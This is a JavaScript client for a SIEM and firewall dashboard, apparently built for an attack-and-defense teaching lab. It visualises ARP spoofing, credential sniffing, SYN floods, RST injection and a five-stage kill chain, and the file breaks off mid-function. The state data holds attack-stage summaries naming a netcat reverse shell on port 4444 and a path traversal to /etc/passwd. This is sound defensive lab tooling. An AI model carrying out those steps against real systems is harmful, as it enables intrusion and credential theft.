/**
 * ==============================================================================
 * GOD-VIEW SIEM & FIREWALL MONITOR - CLIENT APP
 * Real-time WebSocket Ingestion, Canvas Particle Stream, Defense Controls
 * ==============================================================================
 */

// State Management
const state = {
  logs: [],
  maxLogs: 300,
  defenseL1Active: false,
  defenseL2Active: false,
  defenseL3Active: null,
  defenseL3Subflags: {
    anti_sqli: false,
    rate_limit: false,
    input_sanitization: false,
  },
  attackEvents: [],
  autoScroll: true,
  filterTag: 'ALL',
  searchQuery: '',
  selectedLog: null,
  socket: null,
  rttLatency: null,
  warningTimer: null,
  rstBannerTimer: null,
  synPeak: 0,
  networkState: {
    mitm_active: false,
    arp_table: [
      { ip: '172.20.0.10', mac: '02:42:ac:14:00:0a', expected_mac: '02:42:ac:14:00:0a', iface: 'eth0', role: 'CLIENT', spoofed: false },
      { ip: '172.20.0.20', mac: '02:42:ac:14:00:14', expected_mac: '02:42:ac:14:00:14', iface: 'eth0', role: 'TARGET_SERVER', spoofed: false },
      { ip: '172.20.0.66', mac: '02:42:ac:14:00:42', expected_mac: '02:42:ac:14:00:42', iface: 'eth0', role: 'HACKER', spoofed: false },
    ],
    sniffed_packets: [],
    rst_injection: {
      active: false,
      disrupted_sessions: 0,
      last_rst_at: null,
      last_seq_num: null,
      victim_ip: '172.20.0.10',
      target_ip: '172.20.0.20',
    },
    syn_history: Array(16).fill(0),
  },
  osL7State: {
    pstree: [
      {
        pid: 1,
        name: 'python3',
        cmd: 'python3 /app/target-entrypoint.py',
        user: 'root',
        suspicious: false,
        children: [
          { pid: 18, name: 'sshd', cmd: '/usr/sbin/sshd -D -e', user: 'root', suspicious: false },
          {
            pid: 24,
            name: 'node',
            cmd: 'node dist/main.js (Target Server :8000)',
            user: 'node',
            suspicious: false,
            children: [
              { pid: 31, name: 'sqlite3-worker', cmd: 'sqlite3 /data/target.sqlite', user: 'node', suspicious: false },
            ],
          },
        ],
      },
    ],
    suspicious_processes: [],
    reverse_shell: {
      active: false,
      spawned_at: null,
      shell_cmd: null,
      server_ip: '172.20.0.20',
      hacker_ip: '172.20.0.66',
      hacker_port: 4444,
      pid: null,
    },
    fd_metrics: {
      open_fds: 42,
      max_fds: 1024,
      peak_fds: 42,
      status: 'NORMAL',
      suspicious_files: [],
      process_count: 4,
    },
    l7_alerts: [],
    l7_counters: {
      sqli_count: 0,
      brute_force_count: 0,
      cmd_injection_count: 0,
      path_traversal_count: 0,
      heavy_dos_count: 0,
    },
  },
  bruteForceCounter: 0,
  killChain: {
    active: false,
    current_stage: null,
    autoPlaying: false,
    stages: [
      { stage: 1, code: 'RECON_MITM', state: 'IDLE', blocked_by: null, summary: 'ARP Poisoning & HTTP Credential Sniffer' },
      { stage: 2, code: 'L7_AUTH_BYPASS', state: 'IDLE', blocked_by: null, summary: '1 req/s L1 Bypass & SQLi Admin Auth' },
      { stage: 3, code: 'OS_REVERSE_SHELL', state: 'IDLE', blocked_by: null, summary: 'Cmd Injection -> /bin/sh -> nc :4444' },
      { stage: 4, code: 'DATA_EXFILTRATION', state: 'IDLE', blocked_by: null, summary: 'Path Traversal /etc/passwd & R&D Flag' },
      { stage: 5, code: 'SYN_FD_IMPACT', state: 'IDLE', blocked_by: null, summary: 'SYN_RECV Flood, lsof EMFILE & TCP RST' },
    ],
  },
  // W6-T1: rAF Event Batching & Throttling State (chống đơ trình duyệt khi bắn hàng vạn gói SYN Flood)
  perf: {
    incomingLogQueue: [],
    pendingMetrics: null,
    pendingNetworkState: null,
    pendingOsL7State: null,
    pendingKillChain: null,
    pendingDefense: null,
    rafScheduled: false,
    packetsThisSecond: 0,
    coalescedBursts: 0,
    currentFps: 60,
    frameCount: 0,
    lastFpsCheck: performance.now(),
  },
  resetToastTimer: null,
};

// ==========================================
// 1. INITIALIZATION & SOCKET.IO SETUP
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
  updateDefenseUI(null);
  updateNetworkStateUI(state.networkState);
  updateOsL7StateUI(state.osL7State);
  updateKillChainUI(state.killChain);
  initSocket();
  initCanvas();
  initEventListeners();
  startReverseShellBeaconLoop();
  startFpsAndThroughputMonitor();
});

function initSocket() {
  const socketUrl = window.location.origin;
  state.socket = io(socketUrl, {
    transports: ['websocket', 'polling'],
  });

  const led = document.getElementById('socket-led');
  const statusText = document.getElementById('socket-status-text');

  state.socket.on('connect', () => {
    led.className = 'pulse-led connected';
    statusText.textContent = `CONNECTED :${window.location.port || '4000'}`;
    startRttHeartbeat();
  });

  state.socket.on('disconnect', () => {
    led.className = 'pulse-led disconnected';
    statusText.textContent = 'DISCONNECTED';
    updateDefenseUI(null);
    document.getElementById('rtt-value').textContent = '-- ms';
  });

  // Nhận trạng thái ban đầu và lịch sử khi vừa tải trang
  state.socket.on('INITIAL_STATE', (data) => {
    if (data.history && Array.isArray(data.history)) {
      state.logs = data.history;
      renderTable();
      updateBufferCount();
    }
    updateDefenseUI(data.defense_l3_state, data.defense_layers, data.current_state);
    state.attackEvents = data.attack_events || [];
    renderAttackEvents();
    for (const [node, ip] of Object.entries(data.nodes || {})) {
      const element = document.querySelector(`#node-${node === 'target' ? 'server' : node === 'attacker' ? 'hacker' : node} .node-ip`);
      if (element) element.textContent = ip;
    }
    if (data.metrics) {
      updateMetricsUI(data.metrics);
    }
    if (data.network_state) {
      updateNetworkStateUI(data.network_state, data.metrics);
    }
    if (data.os_l7_state) {
      updateOsL7StateUI(data.os_l7_state);
    }
    if (data.kill_chain) {
      updateKillChainUI(data.kill_chain);
    }
  });

  // Nhận bản tin Telemetry thời gian thực từ Target App (W6-T1: Gom nhóm sự kiện rAF Throttling chống đơ trình duyệt)
  state.socket.on('GOD_VIEW_UPDATE', (payload) => {
    enqueueTelemetryUpdate(payload);
  });

  // Nhận cập nhật trạng thái mạng L2/L4 trực tiếp (ARP, MitM, SYN, RST)
  state.socket.on('NETWORK_STATE_UPDATE', (payload) => {
    if (payload.metrics) state.perf.pendingMetrics = payload.metrics;
    if (payload.network_state) state.perf.pendingNetworkState = payload.network_state;
    schedulePerfFlush();
  });

  // Nhận cập nhật trạng thái HĐH & Tầng L7 trực tiếp (W4-T1: pstree, reverse shell, lsof, SQLi/Brute-force)
  state.socket.on('OS_L7_STATE_UPDATE', (payload) => {
    if (payload.metrics) state.perf.pendingMetrics = payload.metrics;
    if (payload.os_l7_state) state.perf.pendingOsL7State = payload.os_l7_state;
    schedulePerfFlush();
  });

  // Nhận cập nhật tiến trình Kill Chain 5 giai đoạn (W6-ALL)
  state.socket.on('KILL_CHAIN_UPDATE', (payload) => {
    if (payload && payload.kill_chain) {
      updateKillChainUI(payload.kill_chain);
    }
    if (payload && payload.defense_layers) {
      updateDefenseUI(payload.defense_layers.l3_app, payload.defense_layers);
    }
  });

  // Nhận sự kiện đồng bộ khi khiên phòng thủ thay đổi (W5-T1: L1, L2, L3)
  state.socket.on('DEFENSE_TOGGLED', (payload) => {
    updateDefenseUI(payload.defense_l3_state, payload.defense_layers, payload.current_state);
  });

  state.socket.on('ATTACK_EVENT', (event) => {
    if (!state.attackEvents.some(item => item.event_id === event.event_id)) state.attackEvents.push(event);
    state.attackEvents = state.attackEvents.slice(-300);
    renderAttackEvents();
  });
  state.socket.on('DEFENSE_ERROR', payload => {
    document.getElementById('defense-error').textContent = payload.message;
  });

  // Nhận sự kiện xóa rỗng bộ đệm & 1-Touch Lab Reset (W6-T1)
  state.socket.on('GOD_VIEW_RESET', (payload) => {
    state.logs = [];
    state.attackEvents = [];
    state.synPeak = 0;
    state.bruteForceCounter = 0;
    state.perf.incomingLogQueue = [];
    state.perf.pendingMetrics = null;
    state.perf.pendingNetworkState = null;
    state.perf.pendingOsL7State = null;
    state.perf.pendingKillChain = null;
    if (payload && payload.metrics) updateMetricsUI(payload.metrics);
    if (payload && payload.network_state) updateNetworkStateUI(payload.network_state, payload.metrics);
    if (payload && payload.os_l7_state) updateOsL7StateUI(payload.os_l7_state);
    if (payload && payload.kill_chain) updateKillChainUI(payload.kill_chain);
    if (payload && payload.defense_layers) {
      updateDefenseUI(payload.defense_l3_state, payload.defense_layers);
    }
    if (payload && payload.reset_summary) {
      showResetToastBanner(payload.reset_summary, payload.message);
    }
    renderAttackEvents();
    renderTable();
    updateBufferCount();
    clearParticles();
  });

  // Xử lý đo độ trễ RTT
  state.socket.on('pong_rtt', (data) => {
    const rtt = Date.now() - data.client_time;
    state.rttLatency = rtt;
    document.getElementById('rtt-value').textContent = `${rtt} ms`;
  });
}

function startRttHeartbeat() {
  setInterval(() => {
    if (state.socket && state.socket.connected) {
      state.socket.emit('ping_rtt', { client_time: Date.now() });
    }
  }, 2500);
}

// ==========================================
// 2. INCOMING TELEMETRY, rAF BATCH THROTTLING (W6-T1) & ALERT HANDLING
// ==========================================
const MAX_ACTIVE_PARTICLES = 180;
const MAX_SPARKS = 90;
const MAX_FLOATING_LABELS = 18;
const MAX_PARTICLE_SPAWNS_PER_FRAME = 10;

function enqueueTelemetryUpdate(payload) {
  if (!payload) return;
  const { log, metrics, network_state, os_l7_state, kill_chain, defense_l3_state, defense_layers } = payload;

  if (log) {
    state.perf.incomingLogQueue.push(log);
    state.perf.packetsThisSecond += 1;
  }
  if (metrics) state.perf.pendingMetrics = metrics;
  if (network_state) state.perf.pendingNetworkState = network_state;
  if (os_l7_state) state.perf.pendingOsL7State = os_l7_state;
  if (kill_chain) state.perf.pendingKillChain = kill_chain;
  if (defense_layers || defense_l3_state !== undefined) {
    state.perf.pendingDefense = { defense_l3_state, defense_layers };
  }

  schedulePerfFlush();
}

function schedulePerfFlush() {
  if (state.perf.rafScheduled) return;
  state.perf.rafScheduled = true;
  requestAnimationFrame(flushTelemetryQueue);
}

function flushTelemetryQueue() {
  state.perf.rafScheduled = false;

  // 1. Cập nhật các bảng trạng thái tổng hợp 1 lần duy nhất mỗi frame
  const latestMetrics = state.perf.pendingMetrics;
  state.perf.pendingMetrics = null;

  if (state.perf.pendingNetworkState) {
    const net = state.perf.pendingNetworkState;
    state.perf.pendingNetworkState = null;
    updateNetworkStateUI(net, latestMetrics);
  }
  if (state.perf.pendingOsL7State) {
    const osState = state.perf.pendingOsL7State;
    state.perf.pendingOsL7State = null;
    updateOsL7StateUI(osState);
  }
  if (state.perf.pendingKillChain) {
    const kc = state.perf.pendingKillChain;
    state.perf.pendingKillChain = null;
    updateKillChainUI(kc);
  }
  if (latestMetrics) {
    updateMetricsUI(latestMetrics);
  }
  if (state.perf.pendingDefense) {
    const def = state.perf.pendingDefense;
    state.perf.pendingDefense = null;
    updateDefenseUI(def.defense_l3_state, def.defense_layers);
  }

  // 2. Gom nhóm (Batching) toàn bộ bản tin HTTP/Attack log đến trong cùng frame
  const batch = state.perf.incomingLogQueue;
  if (batch.length === 0) return;
  state.perf.incomingLogQueue = [];

  if (batch.length > 1) {
    state.perf.coalescedBursts += 1;
  }

  let latestAttackLog = null;
  // Chỉ bắn hạt Canvas cho tối đa MAX_PARTICLE_SPAWNS_PER_FRAME mẫu đại diện để không làm nghẽn GPU khi bão SYN Flood
  const particleStride = Math.max(1, Math.ceil(batch.length / MAX_PARTICLE_SPAWNS_PER_FRAME));

  for (let i = 0; i < batch.length; i++) {
    const log = batch[i];
    state.logs.push(log);
    if (i % particleStride === 0 || i === batch.length - 1) {
      spawnPacketParticles(log);
    }
    const isAttack = Boolean(log.is_suspicious || (log.attack_tag && log.attack_tag !== 'NORMAL'));
    if (isAttack) {
      latestAttackLog = log;
    }
  }

  if (state.logs.length > state.maxLogs) {
    state.logs = state.logs.slice(-state.maxLogs);
  }

  updateBufferCount();
  if (latestAttackLog) {
    triggerWarningBanner(latestAttackLog);
  }

  // Chèn hàng loạt vào DOM bằng DocumentFragment (1 lần reflow duy nhất)
  appendTableRowBatch(batch);
}

function handleIncomingTelemetry(log) {
  enqueueTelemetryUpdate({ log });
}

function startFpsAndThroughputMonitor() {
  setInterval(() => {
    const badge = document.getElementById('fps-throttle-badge');
    if (!badge) return;
    const pps = state.perf.packetsThisSecond;
    state.perf.packetsThisSecond = 0;
    const fps = Math.min(60, Math.max(24, state.perf.currentFps || 60));
    if (pps > 15) {
      badge.textContent = `${fps} FPS · BATCHING (${pps} pkt/s)`;
      badge.style.color = '#D97706';
    } else {
      badge.textContent = `${fps} FPS · THROTTLED`;
      badge.style.color = '';
    }
  }, 1000);
}

function updateBufferCount() {
  document.getElementById('buffer-count-badge').textContent = `${state.logs.length} / ${state.maxLogs}`;
  document.getElementById('table-record-count').textContent = `${state.logs.length} entries`;
}

function triggerWarningBanner(log) {
  const banner = document.getElementById('warning-banner');
  const details = document.getElementById('warning-details');

  const tag = log.attack_tag || 'SUSPICIOUS_ACTIVITY';
  details.textContent = `${tag} DETECTED FROM ${log.client_ip} -> ${log.endpoint} [Status: ${log.status_code}]`;
  banner.classList.remove('hidden');

  if (state.warningTimer) clearTimeout(state.warningTimer);
  state.warningTimer = setTimeout(() => {
    banner.classList.add('hidden');
  }, 6000);
}

// ==========================================
// 3. W5-T1: 3-LAYER DEFENSE SHIELD & SYSTEM METRICS
// ==========================================
function updateDefenseUI(isL3Active, defenseLayers, currentState) {
  if (defenseLayers && typeof defenseLayers === 'object') {
    if (typeof defenseLayers.l1_network === 'boolean') state.defenseL1Active = defenseLayers.l1_network;
    if (typeof defenseLayers.l2_os === 'boolean') state.defenseL2Active = defenseLayers.l2_os;
    if (defenseLayers.l3_app !== undefined) state.defenseL3Active = defenseLayers.l3_app;
    if (defenseLayers.l3_subflags && typeof defenseLayers.l3_subflags === 'object') {
      state.defenseL3Subflags = { ...state.defenseL3Subflags, ...defenseLayers.l3_subflags };
    }
  }
  if (isL3Active !== undefined) {
    state.defenseL3Active = isL3Active;
  }
  if (currentState && typeof currentState === 'object') {
    state.defenseL3Subflags = {
      anti_sqli: Boolean(currentState.anti_sqli),
      rate_limit: Boolean(currentState.rate_limit),
      input_sanitization: Boolean(currentState.input_sanitization),
    };
  } else if (typeof state.defenseL3Active === 'boolean' && (!defenseLayers || !defenseLayers.l3_subflags)) {
    state.defenseL3Subflags = {
      anti_sqli: state.defenseL3Active,
      rate_limit: state.defenseL3Active,
      input_sanitization: state.defenseL3Active,
    };
  }

  // 1. Update Layer 1 (Network Shield) UI
  const l1Pill = document.getElementById('defense-l1-pill');
  const l1Btn = document.getElementById('btn-toggle-defense-l1');
  const l1BtnText = document.getElementById('defense-l1-btn-text');
  const l1Row = document.getElementById('shield-row-l1');
  const l1Aura = document.getElementById('shield-aura-l1');
  const l1Badge = document.getElementById('shield-l1-badge');

  if (state.defenseL1Active) {
    if (l1Pill) { l1Pill.textContent = 'ACTIVE'; l1Pill.className = 'pill-active'; }
    if (l1Btn) l1Btn.classList.add('active');
    if (l1BtnText) l1BtnText.textContent = 'DISABLE L1';
    if (l1Row) l1Row.classList.add('layer-active');
    if (l1Aura) l1Aura.classList.remove('inactive');
    if (l1Badge) { l1Badge.textContent = 'L1 NET: ON'; l1Badge.className = 'badge badge-shield'; }
  } else {
    if (l1Pill) { l1Pill.textContent = 'BYPASSED'; l1Pill.className = 'pill-inactive'; }
    if (l1Btn) l1Btn.classList.remove('active');
    if (l1BtnText) l1BtnText.textContent = 'ENABLE L1';
    if (l1Row) l1Row.classList.remove('layer-active');
    if (l1Aura) l1Aura.classList.add('inactive');
    if (l1Badge) { l1Badge.textContent = 'L1 NET: OFF'; l1Badge.className = 'badge badge-shield inactive'; }
  }

  // 2. Update Layer 2 (OS & Kernel Shield) UI
  const l2Pill = document.getElementById('defense-l2-pill');
  const l2Btn = document.getElementById('btn-toggle-defense-l2');
  const l2BtnText = document.getElementById('defense-l2-btn-text');
  const l2Row = document.getElementById('shield-row-l2');
  const l2Aura = document.getElementById('shield-aura-l2');
  const l2Badge = document.getElementById('shield-l2-badge');

  if (state.defenseL2Active) {
    if (l2Pill) { l2Pill.textContent = 'ACTIVE'; l2Pill.className = 'pill-active'; }
    if (l2Btn) l2Btn.classList.add('active');
    if (l2BtnText) l2BtnText.textContent = 'DISABLE L2';
    if (l2Row) l2Row.classList.add('layer-active');
    if (l2Aura) l2Aura.classList.remove('inactive');
    if (l2Badge) { l2Badge.textContent = 'L2 OS: ON'; l2Badge.className = 'badge badge-shield'; }
  } else {
    if (l2Pill) { l2Pill.textContent = 'BYPASSED'; l2Pill.className = 'pill-inactive'; }
    if (l2Btn) l2Btn.classList.remove('active');
    if (l2BtnText) l2BtnText.textContent = 'ENABLE L2';
    if (l2Row) l2Row.classList.remove('layer-active');
    if (l2Aura) l2Aura.classList.add('inactive');
    if (l2Badge) { l2Badge.textContent = 'L2 OS: OFF'; l2Badge.className = 'badge badge-shield inactive'; }
  }

  // 3. Update Layer 3 (Application Shield L7) UI
  const l3Pill = document.getElementById('defense-l3-pill');
  const btn = document.getElementById('btn-toggle-defense');
  const l3Row = document.getElementById('shield-row-l3');
  const shieldAura = document.getElementById('shield-aura');
  const shieldBadge = document.getElementById('shield-badge-indicator');
  const btnText = document.getElementById('defense-btn-text');

  const l3AnySubActive = Boolean(
    state.defenseL3Active ||
      (typeof state.defenseL3Active === 'boolean' &&
        (state.defenseL3Subflags.anti_sqli ||
          state.defenseL3Subflags.rate_limit ||
          state.defenseL3Subflags.input_sanitization)),
  );

  if (typeof state.defenseL3Active !== 'boolean') {
    if (l3Pill) { l3Pill.textContent = 'UNKNOWN'; l3Pill.className = 'pill-inactive'; }
    if (btn) btn.classList.remove('active');
    if (btnText) btnText.textContent = 'CHECK L3';
    if (l3Row) l3Row.classList.remove('layer-active');
    if (shieldAura) shieldAura.classList.add('inactive');
    if (shieldBadge) {
      shieldBadge.textContent = 'L3 APP: UNKNOWN';
      shieldBadge.className = 'badge badge-shield inactive';
    }
  } else {
    document.getElementById('defense-error').textContent = '';
    if (state.defenseL3Active) {
      if (l3Pill) { l3Pill.textContent = 'ACTIVE'; l3Pill.className = 'pill-active'; }
      if (btn) btn.classList.add('active');
      if (btnText) btnText.textContent = 'DISABLE L3';
      if (l3Row) l3Row.classList.add('layer-active');
      if (shieldAura) shieldAura.classList.remove('inactive');
      if (shieldBadge) {
        shieldBadge.textContent = 'L3 APP: ON';
        shieldBadge.className = 'badge badge-shield';
      }
    } else if (l3AnySubActive) {
      if (l3Pill) { l3Pill.textContent = 'PARTIAL'; l3Pill.className = 'pill-active'; }
      if (btn) btn.classList.add('active');
      if (btnText) btnText.textContent = 'ENABLE ALL L3';
      if (l3Row) l3Row.classList.add('layer-active');
      if (shieldAura) shieldAura.classList.remove('inactive');
      if (shieldBadge) {
        shieldBadge.textContent = 'L3 APP: PARTIAL';
        shieldBadge.className = 'badge badge-shield';
      }
    } else {
      if (l3Pill) { l3Pill.textContent = 'BYPASSED'; l3Pill.className = 'pill-inactive'; }
      if (btn) btn.classList.remove('active');
      if (btnText) btnText.textContent = 'ENABLE L3';
      if (l3Row) l3Row.classList.remove('layer-active');
      if (shieldAura) shieldAura.classList.add('inactive');
      if (shieldBadge) {
        shieldBadge.textContent = 'L3 APP: OFF';
        shieldBadge.className = 'badge badge-shield inactive';
      }
    }
  }

  // 4. Update L3 Sub-flag chips
  const sqliChip = document.getElementById('btn-subflag-sqli');
  const sqliVal = document.getElementById('subflag-sqli-val');
  const rlChip = document.getElementById('btn-subflag-ratelimit');
  const rlVal = document.getElementById('subflag-ratelimit-val');
  const sanChip = document.getElementById('btn-subflag-sanitize');
  const sanVal = document.getElementById('subflag-sanitize-val');

  const sqliOn = typeof state.defenseL3Active === 'boolean' && (state.defenseL3Active || state.defenseL3Subflags.anti_sqli);
  const rlOn = typeof state.defenseL3Active === 'boolean' && (state.defenseL3Active || state.defenseL3Subflags.rate_limit);
  const sanOn = typeof state.defenseL3Active === 'boolean' && (state.defenseL3Active || state.defenseL3Subflags.input_sanitization);

  if (sqliChip) sqliChip.classList.toggle('subflag-on', sqliOn);
  if (sqliVal) sqliVal.textContent = sqliOn ? 'ON' : 'OFF';
  if (rlChip) rlChip.classList.toggle('subflag-on', rlOn);
  if (rlVal) rlVal.textContent = rlOn ? 'ON' : 'OFF';
  if (sanChip) sanChip.classList.toggle('subflag-on', sanOn);
  if (sanVal) sanVal.textContent = sanOn ? 'ON' : 'OFF';

  // 5. Update Master Funnel Summary Pill & Badge
  const activeCount =
    (state.defenseL1Active ? 1 : 0) +
    (state.defenseL2Active ? 1 : 0) +
    (l3AnySubActive ? 1 : 0);
  const masterPill = document.getElementById('defense-state-pill');
  const funnelBadge = document.getElementById('funnel-active-count');
  if (funnelBadge) {
    funnelBadge.textContent = `${activeCount} / 3 SHIELDS`;
    funnelBadge.className = activeCount > 0 ? 'badge badge-shield' : 'badge badge-shield inactive';
  }
  if (masterPill) {
    if (activeCount === 3) {
      masterPill.textContent = 'FULL 3-LAYER';
      masterPill.className = 'pill-active';
    } else if (activeCount > 0) {
      masterPill.textContent = `${activeCount}/3 ACTIVE`;
      masterPill.className = 'pill-active';
    } else {
      masterPill.textContent = typeof state.defenseL3Active === 'boolean' ? 'BYPASSED' : 'UNKNOWN';
      masterPill.className = 'pill-inactive';
    }
  }
}

function updateMetricsUI(metrics) {
  document.getElementById('metric-established').textContent = metrics.established;
  document.getElementById('metric-syn-recv').textContent = metrics.syn_recv;
  document.getElementById('metric-time-wait').textContent = metrics.time_wait;

  // Cập nhật thanh đo phần trăm
  document.getElementById('meter-established-fill').style.width = `${Math.min(100, (metrics.established / 80) * 100)}%`;
  document.getElementById('meter-syn-recv-fill').style.width = `${Math.min(100, (metrics.syn_recv / 150) * 100)}%`;
  document.getElementById('meter-time-wait-fill').style.width = `${Math.min(100, (metrics.time_wait / 40) * 100)}%`;

  if (typeof metrics.syn_recv === 'number' && metrics.syn_recv > state.synPeak) {
    state.synPeak = metrics.syn_recv;
  }
  renderSynBarChart(state.networkState.syn_history, metrics.syn_recv);
}

// ==========================================
// 3B. W3-T1: L2/L4 NETWORK ATTACK VISUALIZATION (ARP, MITM, SYN CHART, RST)
// ==========================================
function updateNetworkStateUI(netState, metrics) {
  if (!netState) return;
  state.networkState = {
    ...state.networkState,
    ...netState,
  };

  const mitmBadge = document.getElementById('mitm-badge-indicator');
  const hackerNode = document.getElementById('node-hacker');
  const hackerStatus = document.getElementById('hacker-status');

  if (state.networkState.mitm_active) {
    mitmBadge.classList.remove('hidden');
    hackerNode.classList.add('mitm-active');
    hackerStatus.textContent = '⚠️ MITM INTERCEPTING';
  } else {
    mitmBadge.classList.add('hidden');
    hackerNode.classList.remove('mitm-active');
    hackerStatus.textContent = 'STANDBY';
  }

  renderArpCacheTable(state.networkState.arp_table, state.networkState.mitm_active);
  renderMitmSnifferWindow(state.networkState.sniffed_packets, state.networkState.mitm_active);
  renderRstMonitor(state.networkState.rst_injection);
  const currentSyn = metrics && typeof metrics.syn_recv === 'number'
    ? metrics.syn_recv
    : (state.networkState.syn_history[state.networkState.syn_history.length - 1] || 0);
  if (currentSyn > state.synPeak) state.synPeak = currentSyn;
  renderSynBarChart(state.networkState.syn_history, currentSyn);
}

function renderArpCacheTable(arpTable, mitmActive) {
  const tbody = document.getElementById('arp-table-body');
  const card = document.getElementById('arp-cache-card');
  const badge = document.getElementById('arp-status-badge');
  const alertBox = document.getElementById('arp-poison-alert');
  const spoofedMacEl = document.getElementById('spoofed-mac-value');
  if (!tbody) return;

  const hasSpoof = Boolean(mitmActive || (Array.isArray(arpTable) && arpTable.some((e) => e.spoofed)));
  if (hasSpoof) {
    card.classList.add('card-alert-red');
    badge.className = 'badge badge-attack';
    badge.textContent = '⚠️ MAC SPOOFED';
    alertBox.classList.remove('hidden');
    const spoofedEntry = (arpTable || []).find((e) => e.spoofed);
    if (spoofedEntry && spoofedMacEl) spoofedMacEl.textContent = spoofedEntry.mac;
  } else {
    card.classList.remove('card-alert-red');
    badge.className = 'badge badge-normal';
    badge.textContent = 'ARP: VERIFIED';
    alertBox.classList.add('hidden');
  }

  tbody.innerHTML = '';
  for (const entry of arpTable || []) {
    const tr = document.createElement('tr');
    if (entry.spoofed) tr.className = 'arp-row-spoofed';
    const expectedInfo = entry.spoofed && entry.expected_mac && entry.expected_mac !== entry.mac
      ? `<span class="mac-expected">Real: ${escapeHtml(entry.expected_mac)}</span>`
      : '';
    const statusBadge = entry.spoofed
      ? '<span class="badge badge-attack">⚠️ POISONED</span>'
      : '<span class="badge badge-normal">DYNAMIC · OK</span>';

    tr.innerHTML = `
      <td><strong>${escapeHtml(entry.role)}</strong></td>
      <td><code>${escapeHtml(entry.ip)}</code></td>
      <td class="mac-cell"><code>${escapeHtml(entry.mac)}</code>${expectedInfo}</td>
      <td>${escapeHtml(entry.iface || 'eth0')}</td>
      <td>${statusBadge}</td>
    `;
    tbody.appendChild(tr);
  }
}

function renderMitmSnifferWindow(packets, mitmActive) {
  const listEl = document.getElementById('mitm-sniffer-list');
  const countBadge = document.getElementById('sniffer-count-badge');
  const statusBadge = document.getElementById('sniffer-status-badge');
  if (!listEl) return;

  const list = Array.isArray(packets) ? packets : [];
  countBadge.textContent = `${list.length} captured`;

  if (mitmActive) {
    statusBadge.className = 'badge badge-attack';
    statusBadge.textContent = '🔴 INTERCEPTING HTTP';
  } else {
    statusBadge.className = 'badge badge-shield inactive';
    statusBadge.textContent = 'STANDBY';
  }

  if (list.length === 0) {
    listEl.innerHTML = `
      <div class="sniffer-empty">
        Chưa có gói tin bị bắt lén. Khi <strong>ARP Spoofing (MitM)</strong> kích hoạt, luồng đăng nhập của Client đi vòng qua Hacker sẽ bị bóc tách mật khẩu tại đây.
      </div>
    `;
    return;
  }

  listEl.innerHTML = '';
  for (const pkt of list.slice(-15).reverse()) {
    const item = document.createElement('div');
    item.className = 'sniffer-entry';
    const timeStr = pkt.timestamp ? new Date(pkt.timestamp).toTimeString().split(' ')[0] : '--:--:--';
    item.innerHTML = `
      <div class="sniffer-entry-top">
        <span>[${escapeHtml(timeStr)}] ${escapeHtml(pkt.src_ip)} &rarr; [MITM] &rarr; ${escapeHtml(pkt.dst_ip)}</span>
        <span>${escapeHtml(pkt.method)} ${escapeHtml(pkt.endpoint)}</span>
      </div>
      <div class="sniffer-creds">
        🔑 USER: <code>${escapeHtml(pkt.username || 'N/A')}</code> | PASS: <code>${escapeHtml(pkt.password || 'N/A')}</code>
      </div>
      <div class="sniffer-token" title="${escapeHtml(pkt.token_preview || pkt.raw_preview)}">
        🪙 TOKEN: ${escapeHtml(pkt.token_preview || pkt.raw_preview)}
      </div>
    `;
    listEl.appendChild(item);
  }
}

function renderSynBarChart(history, currentVal) {
  const chartEl = document.getElementById('syn-bar-chart');
  const currentEl = document.getElementById('syn-chart-current');
  const peakEl = document.getElementById('syn-chart-peak');
  const badgeEl = document.getElementById('syn-backlog-badge');
  const cardEl = document.getElementById('syn-rst-card');
  if (!chartEl) return;

  const series = Array.isArray(history) && history.length > 0 ? history : Array(16).fill(0);
  const latest = typeof currentVal === 'number' ? currentVal : (series[series.length - 1] || 0);

  if (currentEl) currentEl.textContent = String(latest);
  if (peakEl) peakEl.textContent = String(Math.max(state.synPeak, latest));

  if (latest >= 80) {
    badgeEl.className = 'badge badge-attack';
    badgeEl.textContent = '🔥 BACKLOG: FLOODED';
    cardEl.classList.add('card-alert-red');
  } else if (latest >= 35) {
    badgeEl.className = 'badge badge-mitm';
    badgeEl.textContent = '⚠️ BACKLOG: ELEVATED';
    cardEl.classList.remove('card-alert-red');
  } else {
    badgeEl.className = 'badge badge-normal';
    badgeEl.textContent = 'BACKLOG: STABLE';
    cardEl.classList.remove('card-alert-red');
  }

  chartEl.innerHTML = '';
  const maxScale = 250;
  for (const val of series) {
    const col = document.createElement('div');
    col.className = 'syn-bar-col';

    const pct = Math.min(100, Math.max(4, Math.round((val / maxScale) * 100)));
    let colorClass = '';
    if (val >= 80) colorClass = 'syn-critical';
    else if (val >= 35) colorClass = 'syn-warn';

    col.innerHTML = `
      <span class="syn-bar-val">${val > 0 ? val : ''}</span>
      <div class="syn-bar-fill ${colorClass}" style="height: ${pct}%;"></div>
    `;
    chartEl.appendChild(col);
  }
}

function renderRstMonitor(rst) {
  if (!rst) return;
  const box = document.getElementById('rst-status-box');
  const pill = document.getElementById('rst-state-pill');
  const countEl = document.getElementById('rst-disrupted-count');
  const seqEl = document.getElementById('rst-last-seq');
  const timeEl = document.getElementById('rst-last-time');
  const topBadge = document.getElementById('rst-badge-indicator');

  if (countEl) countEl.textContent = String(rst.disrupted_sessions || 0);
  if (seqEl) seqEl.textContent = rst.last_seq_num ? String(rst.last_seq_num) : '--';
  if (timeEl) {
    timeEl.textContent = rst.last_rst_at ? new Date(rst.last_rst_at).toTimeString().split(' ')[0] : '--:--:--';
  }

  if (rst.active && rst.disrupted_sessions > 0) {
    box.classList.add('rst-alert');
    pill.className = 'badge badge-attack';
    pill.textContent = '⚡ RST INJECTED';
  } else {
    box.classList.remove('rst-alert');
    pill.className = 'badge badge-normal';
    pill.textContent = 'SESSION: INTACT';
    topBadge.classList.add('hidden');
  }
}

// ==========================================
// 3C. W4-T1: OS & APPLICATION L7 VISUALIZATION (PSTREE, REVERSE SHELL, LSOF FD GAUGE, SQLI/BRUTE-FORCE)
// ==========================================
function updateOsL7StateUI(osState) {
  if (!osState) return;
  state.osL7State = {
    ...state.osL7State,
    ...osState,
  };

  const revShell = state.osL7State.reverse_shell || {};
  const revBadge = document.getElementById('revshell-badge-indicator');
  const serverNode = document.getElementById('node-server');
  const serverStatus = document.getElementById('server-status');

  if (revShell.active) {
    if (revBadge) revBadge.classList.remove('hidden');
    if (serverNode) serverNode.classList.add('compromised');
    if (serverStatus) serverStatus.textContent = `🐚 REVERSE SHELL -> ${revShell.hacker_ip || '172.20.0.66'}:${revShell.hacker_port || 4444}`;
  } else {
    if (revBadge) revBadge.classList.add('hidden');
    if (serverNode) serverNode.classList.remove('compromised');
